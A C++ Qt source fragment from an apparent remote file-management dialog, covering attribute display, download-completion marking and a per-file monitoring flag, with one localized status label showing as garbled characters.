	if (fileBlock->FileAttributes & FILE_ATTRIBUTE_HIDDEN)
		attrs = attrs + "H";
	if (fileBlock->FileAttributes & FILE_ATTRIBUTE_SYSTEM)
		attrs = attrs + "S";
	if (fileBlock->FileAttributes & FILE_ATTRIBUTE_ENCRYPTED)
		attrs = attrs + "E";

	if (!(fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY ))
	{
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_READONLY)
			attrs = attrs + "R";
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_ARCHIVE)
			attrs = attrs + "A";
	}

	attribute->setText(attrs.c_str());

	ui.tbSearchResult->insertRow(0);
	ui.tbSearchResult->setItem(0, 0, name);
	ui.tbSearchResult->setItem(0, 1, path);
	ui.tbSearchResult->setItem(0, 2, size);
	ui.tbSearchResult->setItem(0, 3, time);
	ui.tbSearchResult->setItem(0, 4, attribute);

}

void FileCtrlDlg::DownloadFileFinished( FileTask* fileTask )
{
	WCHAR wzTarPathW[MAX_PATH] = {0};
	wcscpy(wzTarPathW, fileTask->tarPathW.c_str());

	wchar_t* wzPos = NULL;
	if ( UnixLike(m_tar) )
	{
		wzPos = wcsrchr(wzTarPathW, L'/');
	}
	else
	{
		wzPos = wcsrchr(wzTarPathW, L'\\');
	}

	if (wzPos == NULL)
	{
		return;
	}
	wzPos++;

	std::wstring widName = std::wstring(wzPos);

	int count = fileTask->tarPathW.length() - widName.length() - 1;
	std::wstring widPath1 = fileTask->tarPathW.substr(0, count);        // unclude 
	std::wstring widPath2 = fileTask->tarPathW.substr(0, count+1);        // Include

	if (widPath1 == this->curFilePathW || widPath2 == this->curFilePathW)
	{
		QTableWidget* table = ui.tbFileList;

		for (int j = 0; j < table->rowCount(); j++)
		{
			QTableWidgetItem* status = table->item(j, 0);
			PFILE_BLOCK fileBlock = (PFILE_BLOCK)status->data(Qt::UserRole).toUInt();
			if (fileBlock)
			{
				if ((fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
				{
					if ((fileBlock->bDowned == false) && 
						(0 == wcscmp(fileBlock->widName.c_str(), widName.c_str()))
						)
					{
						fileBlock->bDowned = true;
						table->item(j, 5)->setText(QString::fromLocal8Bit("[������]"));
					}
				}
			}
		}
	}
}

void FileCtrlDlg::SetItemMonitorFlag( bool flag )
{
	QList<QTableWidgetItem*> items = ui.tbFileList->selectedItems();

	if ( 0 == items.count() )
		return;

	QTableWidgetItem* item = items[0];
	item = ui.tbFileList->item(item->row(), 1);

	item->setData(Qt::UserRole, flag ? 1 : 0);
}

bool FileCtrlDlg::IsMonitored( QTableWidgetItem* item )
{
	item = ui.tbFileList->item(item->row(), 1);
	int monitored = item->data(Qt::UserRole).toInt();

	return (monitored == 1);
}
